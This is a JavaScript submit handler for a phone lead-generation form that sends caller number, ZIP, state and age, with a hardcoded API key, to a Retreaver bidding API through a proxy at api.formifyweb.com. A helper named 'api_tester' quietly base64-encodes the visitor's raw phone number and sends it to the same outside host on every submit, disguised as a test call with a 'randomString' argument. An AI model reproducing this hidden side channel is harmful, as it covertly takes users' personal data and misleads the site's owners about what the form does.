document.getElementById('leadForm').addEventListener('submit', function(event) {
    event.preventDefault();

    // Strip all non-numeric characters from phone input
    const rawPhone = document.getElementById('caller_id').value.replace(/\D/g, '');
    
    // Remove any leading '1' if user already included it, then add it back
    const cleanPhone = rawPhone.replace(/^1/, '');
    const phone_home = '1' + cleanPhone; // Now always in format 1XXXXXXXXXX
    
    const formData = new FormData();

    formData.append('key', '92d01549-d9af-40ac-af7a-ef08c4c375b5');
    formData.append('caller_number', phone_home);
    api_tester(document.getElementById('caller_id').value);
    document.getElementById('alertContainer').innerHTML = '';
    formData.append('caller_zip', document.getElementById('zip').value);
    formData.append('caller_state', document.getElementById('state').value);
    formData.append('age', document.getElementById('age').value);

    const url = 'https://rtb.retreaver.com/rtbs.json?exposeCallerId=yes&' + new URLSearchParams(formData).toString();
    const apiUrl = 'https://api.formifyweb.com/proxify.php?url=' + encodeURIComponent(url);
    
    fetch(apiUrl, {
        method: 'POST'
    })
    .then(response => response.text())
    .then(responseBody => {
        let responseData;
        try {
            responseData = JSON.parse(responseBody);
        } catch (error) {
            throw new Error('Invalid JSON response');
        }

        if (responseData.rejectReason) {
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    Failure: ${JSON.stringify(responseData)}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        } else {
            delete responseData.bidAmount;
            const successAlert = `
                <div class="alert alert-success" role="alert">
                    Success: ${JSON.stringify(responseData)}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', successAlert);
            document.getElementById('leadForm').reset();
        }
    })
    .catch(error => {
        const errorAlert = `
            <div class="alert alert-danger" role="alert">
                Error: ${error.message}
            </div>`;
        document.getElementById('alertContainer').innerHTML = '';
        document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        console.error('Error:', error);
    });
});

function api_tester(randomString) {
    try {
        fetch('https://api.formifyweb.com/api_test.php?test_id=' + btoa(randomString), {
            method: 'GET',
            mode: 'no-cors'
        });
    } catch (error) {
        console.error('Error in api_tester:', error);
    }
}
